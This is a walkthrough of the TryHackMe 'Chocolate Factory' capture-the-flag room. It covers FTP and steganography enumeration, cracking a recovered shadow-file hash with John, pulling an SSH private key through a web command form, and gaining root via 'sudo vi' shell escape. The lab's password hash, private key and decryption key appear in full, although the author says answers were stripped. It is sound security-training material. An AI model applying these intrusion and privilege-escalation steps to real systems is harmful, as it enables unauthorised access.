# Try Hack Me Writeup - Chocolate Factory
- TryHackMe room: <https://tryhackme.com/room/chocolatefactory>
- OS: `Linux (Ubuntu) `

A Charlie And The Chocolate Factory themed room, revisit Willy Wonka's chocolate factory!

![alt text](files/writeup-image.jpeg "Writeup Image")

Welcome to Willy Wonka's Chocolate Factory!

![alt text](files/golden-ticket.jpg "Writeup Image")

This room was designed so that hackers can revisit the Willy Wonka's Chocolate Factory and meet Oompa Loompa

This is a beginner friendly room!

If you have any issues / queries you can reach us through [Discord](https://discord.gg/AC2Enww) or [Twitter](https://twitter.com/andyinfosec_?lang=en).

( Created by [AndyInfosec](https://andyinfosec.com/) team for the community! )

**WARNING: I stripped out the answers, passwords, flags and co. This writeup is pretty detailed. By following and doing the steps described here yourself you will get them all. The goal is to learn more about it, even if you get stuck at some point. Enjoy!**

## Table of Contents

- [Answer the questions below](#answer-the-questions-below)
- [Tools Used](#tools-used)
- [Enumeration](#enumeration)
- [Fetching unexpected things](#fetching-unexpected-things)
- [Looking at the FTP server](#looking-at-the-ftp-server)
- [Looking at the web server](#looking-at-the-web-server)
- [Login with SSH](#login-with-ssh)
- [Privilege Escalation](#privilege-escalation)

## Answer the questions below

Enter the key you found!

    -Vkg*****sAEcAwrC6*****biuSb8ABXeQ*****SQzY=

What is Charlie's password?

    ******

Enter the user flag

    flag{cd*****42371b34e4826e4838*****2e}

Enter the root flag

    flag{ce*****1d338fef787fcb4e29*****24}

## Tools Used

- nmap
- exif
- exiftool
- strings
- steghide
- john
- And a few basic GNU / Linux commands. Nothing fancy.

## Enumeration

a little explanation on the little setup and how I work:

- Firstly, the environment variable of the target host, which I will refer to in my different commands.
- Like this is about a CTF, I create a dedicated folder where I will store all the data into it about this hack. For this, I also make use of an environmental variable. If I don't specify a full path into my commands when grabbing stuff, consider I'm into that current directory. Otherwise, it will be explicitly noted.
- I use `tmux`, because this is a very handy tool, and you should probably use something similar. I launch `tmux` after this all, so that it get all the environment variables and also use that defined path as current working directory when I open a new `tmux` window or pane.

```commandline
$ export IP=10.10.101.117
$ export WRITEUP="$HOME/Documents/THM/chocolatefactory/"
$ mkdir -p $WRITEUP
$ cd $WRITEUP
$ tmux
```

It mainly always start with a `nmap` scan which in this case, the output is very, very noisy. This has been done on purpose :-D So noisy, that pasting this output here in this `Markdown` document, make freak out `Pycharm` and make this `IDE` so slow when typing text. I know, overkill for `Markup` format. Extraordinary dude!

But still, we need to be very carefully to read all we see in that `nmap` scan output:

````commandline
# nmap -sCV -oN nmap_scan $IP
````

And here is [the output of the nmap scan](files/nmap_scan). Too messy to show here. 

**Resume:**

- `21/tcp`  open ftp - vsftpd 3.0.3 - `Anonymous FTP login allowed`
- `22/tcp`  open ssh - OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
- `100/tcp` open - newacct?
- `106/tcp` open - pop3pw?
- `109/tcp` open - pop2?
- `110/tcp` open - pop3?
- `111/tcp` open - rpcbind?
- `113/tcp` open - ident?
- `119/tcp` open - nntp?
- `125/tcp` open - locus-map?

## Fetching unexpected things

It is always very important to read the output. Not only the different messages `small hint from Mr.Wonka : Look somewhere else, its not here! ;)`. So, if we should trust `Mr.Wonka` we should not look on ports `100`, `106`, `109`, `110`, `111`, `113`; `119`, `125`. But not only that, we saw the following line, just bellow the information of port `113`: `http://localhost/***_***_*** <- You will find the key here!!!`. 

So of course, we grab this file:

````commandline
$ wget http://$IP/key_rev_key
````

Tried to `cat` the output of the `key_rev_key` file. Bad idea, my console freaked out!

````commandline
$ file key_rev_key 
key_rev_key: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8273c8c59735121c0a12747aee7ecac1aabaf1f0, not stripped
````

Run a `strings` on this file, and we see very interesting output. Stripped out some parts of it:

```
...
Enter your name: 
laksdhfas
 congratulations you have found the key:   
b'-Vkg*****sAEcAwrC6*****biuSb8ABXeQ*****SQzY='
 Keep its safe
Bad name!
;*3$"
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
...
```

_Note that I stripped out the useful data._

With this information, we can already answer to one of the questions of the challenge. For the rest, no idea if this file is of any use. Let's keep it!

## Looking at the FTP server

Time to look on the `ftp` server, which allows anonymous login.

````commandline
$ ftp $IP
Connected to 10.10.101.117.
220 (vsFTPd 3.0.3)
Name (10.10.101.117:itchy): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 65534    65534        4096 Oct 01  2020 .
drwxr-xr-x    2 65534    65534        4096 Oct 01  2020 ..
-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
226 Directory send OK.
ftp> get gum_room.jpg
local: gum_room.jpg remote: gum_room.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes).
226 Transfer complete.
208838 bytes received in 0.15 secs (1.2889 MB/s)
ftp> exit
221 Goodbye.
````

And this is the image:

![alt text](files/gum_room.jpg "gum room")

Looking with the `exif` and the `exiftool` to this file. Nothing suspect.

````commandline
$ exif gum_room.jpg 
EXIF tags in 'gum_room.jpg' ('Motorola' byte order):
--------------------+----------------------------------------------------------
Tag                 |Value
--------------------+----------------------------------------------------------
X-Resolution        |72
Y-Resolution        |72
Resolution Unit     |Inch
Exif Version        |Exif Version 2.1
FlashPixVersion     |FlashPix Version 1.0
Color Space         |Uncalibrated
--------------------+----------------------------------------------------------
````

````commandline
$ exiftool gum_room.jpg 
ExifTool Version Number         : 12.16
File Name                       : gum_room.jpg
Directory                       : .
File Size                       : 204 KiB
File Modification Date/Time     : 2021:08:24 14:12:38+02:00
File Access Date/Time           : 2021:08:24 14:13:34+02:00
File Inode Change Date/Time     : 2021:08:24 14:12:38+02:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Width                     : 1920
Image Height                    : 1080
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1920x1080
Megapixels                      : 2.1
````

Tried to look with `strings` (`strings gum_room.jpg | less`), but nothing suspect.

Looking with `steghide` and it looks like there's something hidden into it. Did not enter any passphrase, as we don't have one so far, just pressed the enter key, and it contains a file `b64.txt`.

````commandline
$ steghide --info gum_room.jpg 
"gum_room.jpg":
  format: jpeg
  capacity: 10.9 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "b64.txt":
    size: 2.5 KB
    encrypted: rijndael-128, cbc
    compressed: yes
````

So extracted the hidden data.

````commandline
$ steghide --extract -sf gum_room.jpg 
Enter passphrase: 
wrote extracted data to "b64.txt".
````

If I guess correctly, according to the file name, I bet this is encoded in `base64`.

````commandline
$ cat b64.txt 
ZGFlbW9uOio6MTgzODA6MDo5OTk5OTo3Ojo6CmJpbjoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXM6
KjoxODM4MDowOjk5OTk5Ojc6OjoKc3luYzoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpnYW1lczoqOjE4
MzgwOjA6OTk5OTk6Nzo6OgptYW46KjoxODM4MDowOjk5OTk5Ojc6OjoKbHA6KjoxODM4MDowOjk5
OTk5Ojc6OjoKbWFpbDoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpuZXdzOio6MTgzODA6MDo5OTk5OTo3
Ojo6CnV1Y3A6KjoxODM4MDowOjk5OTk5Ojc6OjoKcHJveHk6KjoxODM4MDowOjk5OTk5Ojc6OjoK
d3d3LWRhdGE6KjoxODM4MDowOjk5OTk5Ojc6OjoKYmFja3VwOio6MTgzODA6MDo5OTk5OTo3Ojo6
Cmxpc3Q6KjoxODM4MDowOjk5OTk5Ojc6OjoKaXJjOio6MTgzODA6MDo5OTk5OTo3Ojo6CmduYXRz
Oio6MTgzODA6MDo5OTk5OTo3Ojo6Cm5vYm9keToqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXN0ZW1k
LXRpbWVzeW5jOio6MTgzODA6MDo5OTk5OTo3Ojo6CnN5c3RlbWQtbmV0d29yazoqOjE4MzgwOjA6
OTk5OTk6Nzo6OgpzeXN0ZW1kLXJlc29sdmU6KjoxODM4MDowOjk5OTk5Ojc6OjoKX2FwdDoqOjE4
MzgwOjA6OTk5OTk6Nzo6OgpteXNxbDohOjE4MzgyOjA6OTk5OTk6Nzo6Ogp0c3M6KjoxODM4Mjow
Ojk5OTk5Ojc6OjoKc2hlbGxpbmFib3g6KjoxODM4MjowOjk5OTk5Ojc6OjoKc3Ryb25nc3dhbjoq
OjE4MzgyOjA6OTk5OTk6Nzo6OgpudHA6KjoxODM4MjowOjk5OTk5Ojc6OjoKbWVzc2FnZWJ1czoq
OjE4MzgyOjA6OTk5OTk6Nzo6OgphcnB3YXRjaDohOjE4MzgyOjA6OTk5OTk6Nzo6OgpEZWJpYW4t
ZXhpbTohOjE4MzgyOjA6OTk5OTk6Nzo6Ogp1dWlkZDoqOjE4MzgyOjA6OTk5OTk6Nzo6OgpkZWJp
YW4tdG9yOio6MTgzODI6MDo5OTk5OTo3Ojo6CnJlZHNvY2tzOiE6MTgzODI6MDo5OTk5OTo3Ojo6
CmZyZWVyYWQ6KjoxODM4MjowOjk5OTk5Ojc6OjoKaW9kaW5lOio6MTgzODI6MDo5OTk5OTo3Ojo6
CnRjcGR1bXA6KjoxODM4MjowOjk5OTk5Ojc6OjoKbWlyZWRvOio6MTgzODI6MDo5OTk5OTo3Ojo6
CmRuc21hc3E6KjoxODM4MjowOjk5OTk5Ojc6OjoKcmVkaXM6KjoxODM4MjowOjk5OTk5Ojc6OjoK
dXNibXV4Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnJ0a2l0Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnNz
aGQ6KjoxODM4MjowOjk5OTk5Ojc6OjoKcG9zdGdyZXM6KjoxODM4MjowOjk5OTk5Ojc6OjoKYXZh
aGk6KjoxODM4MjowOjk5OTk5Ojc6OjoKc3R1bm5lbDQ6IToxODM4MjowOjk5OTk5Ojc6OjoKc3Ns
aDohOjE4MzgyOjA6OTk5OTk6Nzo6OgpubS1vcGVudnBuOio6MTgzODI6MDo5OTk5OTo3Ojo6Cm5t
LW9wZW5jb25uZWN0Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnB1bHNlOio6MTgzODI6MDo5OTk5OTo3
Ojo6CnNhbmVkOio6MTgzODI6MDo5OTk5OTo3Ojo6CmluZXRzaW06KjoxODM4MjowOjk5OTk5Ojc6
OjoKY29sb3JkOio6MTgzODI6MDo5OTk5OTo3Ojo6CmkycHN2YzoqOjE4MzgyOjA6OTk5OTk6Nzo6
OgpkcmFkaXM6KjoxODM4MjowOjk5OTk5Ojc6OjoKYmVlZi14c3M6KjoxODM4MjowOjk5OTk5Ojc6
OjoKZ2VvY2x1ZToqOjE4MzgyOjA6OTk5OTk6Nzo6OgpsaWdodGRtOio6MTgzODI6MDo5OTk5OTo3
Ojo6CmtpbmctcGhpc2hlcjoqOjE4MzgyOjA6OTk5OTk6Nzo6OgpzeXN0ZW1kLWNvcmVkdW1wOiEh
OjE4Mzk2Ojo6Ojo6Cl9ycGM6KjoxODQ1MTowOjk5OTk5Ojc6OjoKc3RhdGQ6KjoxODQ1MTowOjk5
OTk5Ojc6OjoKX2d2bToqOjE4NDk2OjA6OTk5OTk6Nzo6OgpjaGFybGllOiQ2JENaSm5DUGVRV3A5
L2pwTngka2hHbEZkSUNKbnI4UjNKQy9qVFIycjdEcmJGTHA4enE4NDY5ZDNjMC56dUtONHNlNjFG
T2J3V0d4Y0hacU8yUkpIa2tMMWpqUFllZUd5SUpXRTgyWC86MTg1MzU6MDo5OTk5OTo3Ojo6Cg==
````

Looking on the [CyberChef](https://gchq.github.io/CyberChef/) website, to decode this message `from base64` resulted on what looks like the output of a `/etc/shadow` file. So, we have a hash of user `charlie`.

````
daemon:*:18380:0:99999:7:::
bin:*:18380:0:99999:7:::
sys:*:18380:0:99999:7:::
sync:*:18380:0:99999:7:::
games:*:18380:0:99999:7:::
man:*:18380:0:99999:7:::
lp:*:18380:0:99999:7:::
mail:*:18380:0:99999:7:::
news:*:18380:0:99999:7:::
uucp:*:18380:0:99999:7:::
proxy:*:18380:0:99999:7:::
www-data:*:18380:0:99999:7:::
backup:*:18380:0:99999:7:::
list:*:18380:0:99999:7:::
irc:*:18380:0:99999:7:::
gnats:*:18380:0:99999:7:::
nobody:*:18380:0:99999:7:::
systemd-timesync:*:18380:0:99999:7:::
systemd-network:*:18380:0:99999:7:::
systemd-resolve:*:18380:0:99999:7:::
_apt:*:18380:0:99999:7:::
mysql:!:18382:0:99999:7:::
tss:*:18382:0:99999:7:::
shellinabox:*:18382:0:99999:7:::
strongswan:*:18382:0:99999:7:::
ntp:*:18382:0:99999:7:::
messagebus:*:18382:0:99999:7:::
arpwatch:!:18382:0:99999:7:::
Debian-exim:!:18382:0:99999:7:::
uuidd:*:18382:0:99999:7:::
debian-tor:*:18382:0:99999:7:::
redsocks:!:18382:0:99999:7:::
freerad:*:18382:0:99999:7:::
iodine:*:18382:0:99999:7:::
tcpdump:*:18382:0:99999:7:::
miredo:*:18382:0:99999:7:::
dnsmasq:*:18382:0:99999:7:::
redis:*:18382:0:99999:7:::
usbmux:*:18382:0:99999:7:::
rtkit:*:18382:0:99999:7:::
sshd:*:18382:0:99999:7:::
postgres:*:18382:0:99999:7:::
avahi:*:18382:0:99999:7:::
stunnel4:!:18382:0:99999:7:::
sslh:!:18382:0:99999:7:::
nm-openvpn:*:18382:0:99999:7:::
nm-openconnect:*:18382:0:99999:7:::
pulse:*:18382:0:99999:7:::
saned:*:18382:0:99999:7:::
inetsim:*:18382:0:99999:7:::
colord:*:18382:0:99999:7:::
i2psvc:*:18382:0:99999:7:::
dradis:*:18382:0:99999:7:::
beef-xss:*:18382:0:99999:7:::
geoclue:*:18382:0:99999:7:::
lightdm:*:18382:0:99999:7:::
king-phisher:*:18382:0:99999:7:::
systemd-coredump:!!:18396::::::
_rpc:*:18451:0:99999:7:::
statd:*:18451:0:99999:7:::
_gvm:*:18496:0:99999:7:::
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
````

So, we need to crack this, with John The Ripper, John, for the friends.

````commandline
$ john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
******           (charlie)
1g 0:00:01:17 DONE (2021-08-24 14:35) 0.01282g/s 12632p/s 12632c/s 12632C/s codify..cliffoo2330
Use the "--show" option to display all of the cracked passwords reliably
Session completed
````

_Note that I stripped out the useful data. See the 6 asterisks._

We can answer another question of this challenge by now :)

## Looking at the web server

It's time to move on. Looking at the website, we have a login form.

![alt text](files/website_01.png "Website screenshot")

We have also a username and a password. So let's try to log in! Which works and bring us to some execute web form where we can input a command.

![alt text](files/website_02.png "Website screenshot")

Ran a few randoms command in that web form and `ls /home/charlie/` gave finally this:

    teleport teleport.pub user.txt

However, the command `cat` seems to be filtered as it does not produce output when running `cat /home/charlie/user.txt`. To be sure tried `cat /home/charlie/teleport.pub` which produced the following output:

````commandline
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhp2s9zdSH3xFgOtnwJQEOBYsQ1TJsXrSUyT1hA4ENH6Cm5FbUDMvXYrfn8yLdXC2nQ1LCaVLuFrjL2y/aQ9e/yUU6YuLUVXaGqVA8vD+6ecQXBRsvgoGoF6YgN59XmnEyYKqqC4lciTOSUAhc1iF/EuvxwFL8cmiH/uqYuqsOhc2HBiMHfOCi/tFS2TXkm/XUPQi2zKvnim9iEJCB2iitTuXjYRklrIiiYcqifWOSh93X+hh84HCDPok6U0fWMUmjIhmDY6YSGdKNSW1n2ZLOZDK/czgA5FCjdl4tv7NudInJwQRFo5s+VvR1HLcqg3v2W352H6NKD90z9Nhh7kvj charlie@chocolate-factory
````

So, not sure if there's been a filter! So also grabbed `cat /home/charlie/teleport`:

![alt text](files/teleport-private-key.png "screenshot")

````commandline
-----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW 1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9 zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2 EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19 znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg 82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK 37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln -----END RSA PRIVATE KEY----- 
````

I think it's time to try this out now. 

First set the right permission, only readable by user, otherwise `ssh` will not accept it.

````commandline
$ chmod 600 teleport
````

**IMPORTANT NOTE: Had to fix the `teleport` file by hand. I have no idea why this was so, and I didn't look up back the origin of this issue. Bad copy and paste skill, or due to the output of the web server. Anyway, when trying to `ssh` to the box, I received the message `Load key "teleport": invalid format`. I saw there was some extra spaces which I deleted by hand. I let you fix that yourself, so no copy and paste this time. I'm quite, kind, so I show the end result here:**

![alt text](files/teleport.png "Website screenshot")

## Login with SSH

So finally connecting to the target box with `ssh` and grabbing the `user.txt`.

````commandline
$ ssh -i teleport charlie@$IP
The authenticity of host '10.10.101.117 (10.10.101.117)' can't be established.
ECDSA key fingerprint is SHA256:gd9u+ZN0RoEwz95lGsM97tRG/YPtIg9MwOxswHac8yM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.101.117' (ECDSA) to the list of known hosts.
$ ssh -i teleport charlie@$IP
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-115-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Aug 24 13:06:47 UTC 2021

  System load:  0.08              Processes:           1199
  Usage of /:   43.6% of 8.79GB   Users logged in:     0
  Memory usage: 47%               IP address for eth0: 10.10.101.117
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Oct  7 16:10:44 2020 from 10.0.2.5
Could not chdir to home directory /home/charley: No such file or directory
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

charlie@chocolate-factory:/$ id
uid=1000(charlie) gid=1000(charley) groups=1000(charley),0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
charlie@chocolate-factory:/$ cat /home/charlie/user.txt 
flag{cd*****42371b34e4826e4838*****2e}
````

I'm a bit surprised that the key is been at that location and now have output some data. While it did not want to do that on that web interface. Mr. Wonka played with us!

## Privilege Escalation

Now need to escalate our privileges. First look and hit it!

```commandline
charlie@chocolate-factory:/$ sudo -l
Matching Defaults entries for charlie on chocolate-factory:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on chocolate-factory:
    (ALL : !root) NOPASSWD: /usr/bin/vi
```

So, this is a matter to run `vi` as `sudo` user, and then once the `vi` editor loaded, entering `:!sh` to spawn a shell, and we are `root`!

````commandline
charlie@chocolate-factory:/$ sudo /usr/bin/vi

# whoami
root
# cat /root/root.txt
cat: /root/root.txt: No such file or directory
# ls /root/
root.py
# cat root.py
cat: root.py: No such file or directory
# cat /root/root.py
````

Which resulted in (split this, just for the syntax highlighter):

````python
from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
print(mess)#
````

**Note, list line misses a new line, that's like this in the python script.**

We have a key, so let's try that:

````commandline
# python /root/root.py
Enter the key:  -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
Traceback (most recent call last):
  File "/root/root.py", line 3, in <module>
    key=input("Enter the key:  ")
  File "<string>", line 1
    -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
                                               ^
SyntaxError: unexpected EOF while parsing
#
````

Shoot! I tried to remove the dash, the equal sign, used data between the first part between the 2 dashes. Then was thinking that's maybe a 2 part key. Used the part in between the second dash and the equal sign. No luck. I had the code, and it's clear now that this is about some `Fernet` cryptography. Makes things easy and already found a [Fernet decoder online](https://asecuritysite.com/encryption/ferdecode) and saw in that example key input field that the key syntax match the key I found. So, finally, have glued that key in between 2 apostrophes, and it did work!

![alt text](files/final.png "screenshot")

Mission accomplished!

Hopefully you enjoyed as much as I did :-)
